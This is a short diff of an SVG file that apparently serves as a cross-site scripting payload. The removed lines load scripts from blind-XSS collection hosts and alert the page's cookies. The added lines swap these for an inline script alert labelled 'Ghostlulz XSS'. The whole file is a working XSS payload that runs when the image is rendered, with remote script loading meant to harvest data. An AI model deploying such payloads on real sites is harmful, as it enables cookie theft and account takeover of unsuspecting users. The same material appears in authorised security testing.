@@ -3,8 +3,7 @@
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
-   <script type="text/javascript" src="https://ahmedspy1997xssht.xss.ht">
-	alert(1);
-     alert(document.cookies);
+   <script type="text/javascript">
+      alert("Ghostlulz XSS");
    </script>
-   <script  src='https://spy.bxss.in'></script>
+</svg>
